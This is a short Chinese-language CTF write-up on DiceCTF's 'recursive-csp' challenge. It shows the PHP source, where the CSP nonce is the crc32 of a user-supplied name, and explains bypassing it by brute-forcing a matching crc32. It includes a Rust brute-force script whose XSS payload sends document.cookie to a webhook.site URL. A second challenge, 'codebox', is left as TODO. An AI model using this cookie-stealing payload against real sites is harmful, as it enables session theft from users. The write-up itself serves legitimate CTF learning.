---
tags: 
  - CSP
  - TODO
---

# CSP

把两道 CSP 相关的题放在一起。

## recursive csp

题目源码
```html
<?php
  if (isset($_GET["source"])) highlight_file(__FILE__) && die();

  $name = "world";
  if (isset($_GET["name"]) && is_string($_GET["name"]) && strlen($_GET["name"]) < 128) {
    $name = $_GET["name"];
  }

  $nonce = hash("crc32b", $name);
  header("Content-Security-Policy: default-src 'none'; script-src 'nonce-$nonce' 'unsafe-inline'; base-uri 'none';");
?>
<!DOCTYPE html>
<html>
  <head>
    <title>recursive-csp</title>
  </head>
  <body>
    <h1>Hello, <?php echo $name ?>!</h1>
    <h3>Enter your name:</h3>
    <form method="GET">
      <input type="text" placeholder="name" name="name" />
      <input type="submit" />
    </form>
    <!-- /?source -->
  </body>
</html>
```

这题主要是认识下 CSP ([MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_inline_script))，可以看到题目中的 CSP 规则是 `default-src 'none'; script-src 'nonce-$nonce' 'unsafe-inline'`，nonce 部分可控，爆破 crc32 保持 nonce 相同即可。

Rust 写的爆破脚本，来自[Post](https://brycec.me/posts/dicectf_2023_challenges)。
```rust
use rayon::prelude::*;

fn main() {
    let payload = "<script nonce='ZZZZZZZZ'>location.href='https://webhook.site/95269d84-93ab-4b47-964a-b548e8358c09' + document.cookie</script>".to_string();
    let start = payload.find("Z").unwrap();
    (0..=0xFFFFFFFFu32).into_par_iter().for_each(|i| {
        let mut p = payload.clone();
        p.replace_range(start..start+8, &format!("{:08x}", i));
        if crc32fast::hash(p.as_bytes()) == i {
            println!("{} {i} {:08x}", p, i);
        }
    });
}
```

## codebox

一个 trick + CSP 属性的利用。

TODO
